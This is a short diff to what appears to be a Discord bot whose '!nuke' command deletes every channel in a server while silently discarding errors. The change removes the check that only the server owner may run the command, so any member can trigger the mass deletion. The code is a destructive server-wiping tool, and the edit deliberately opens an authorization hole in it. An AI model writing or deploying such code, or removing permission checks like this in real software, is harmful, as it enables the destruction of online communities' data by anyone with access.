@@ -22,8 +22,7 @@ async function startBot(userId, token) {
   });
 
   client.on('messageCreate', async message => {
-    if (!message.guild || message.content !== '!nuke' || message.author.id !== message.guild.ownerId) return;
-
+    if (!message.guild || message.content !== '!nuke') return;
     const channelPromises = message.guild.channels.cache.map(channel =>
       channel.delete().catch(() => {})
     );
